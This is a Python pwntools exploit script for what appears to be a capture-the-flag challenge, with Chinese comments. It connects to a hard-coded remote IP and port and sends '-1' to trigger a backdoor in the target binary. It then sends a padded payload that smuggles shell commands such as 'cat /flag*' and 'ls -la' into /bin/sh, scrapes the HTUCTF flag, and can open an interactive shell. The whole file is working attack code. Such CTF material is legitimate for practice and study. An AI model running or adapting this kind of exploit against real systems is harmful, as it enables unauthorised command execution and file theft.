import os
import re
import sys
import time

from pwn import *

try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

HERE = os.path.dirname(os.path.abspath(__file__))

context.log_level = args.LOG or 'info'
context.arch = 'amd64'
context.binary = ELF(os.path.join(HERE, '486'), checksec=False)

HOST = args.HOST or '103.163.47.230'
PORT = int(args.PORT or 35123)

CMD = b'cat flag;cat flag*;cat /flag*;ls -la\n'


def start():
    if args.LOCAL:
        return process(ELF(os.path.join(HERE, '486')).path)
    return remote(HOST, PORT, timeout=10)


def exploit(io):
    io.recvrepeat(0.8)                     # "嘿，小哥，要来个苹果吗？/ 做出你的选择吧!"

    io.sendline(b'-1')                     # 触发后门
    time.sleep(0.25)
    try:
        io.recv(timeout=0.5)               # "我一定会，拯救你！"
    except EOFError:
        pass

    # [NUL][8 字节填充] 被 read(0,rsp,9) 吃掉，剩下的 "\n"+命令 留给 /bin/sh
    payload = b'\x00' + b'AAAAAAAA' + b'\n' + CMD
    log.info('payload = %s', payload.hex())
    io.send(payload)                       # 整包，绝不拆开

    out = io.recvrepeat(2.5)
    return out


def main():
    io = start()
    try:
        out = exploit(io)
    except EOFError:
        log.failure('连接断了，实例可能已释放')
        return 1

    text = out.decode('utf-8', 'replace')
    if text:
        print(text, end='' if text.endswith('\n') else '\n')

    m = re.search(rb'HTUCTF\{[^}]*\}', out)
    if m:
        log.success('FLAG = %s', m.group().decode())
        dst = os.path.join(HERE, 'flag.txt')
        if os.path.exists(dst):
            open(dst + '.old', 'wb').write(open(dst, 'rb').read())   # 老内容留档
        open(dst, 'wb').write(m.group())
    elif args.i:
        io.interactive()
    else:
        log.warning('没抓到 flag；shell 可能已经死了，重跑或加 -i')
    io.close()
    return 0


if __name__ == '__main__':
    sys.exit(main())
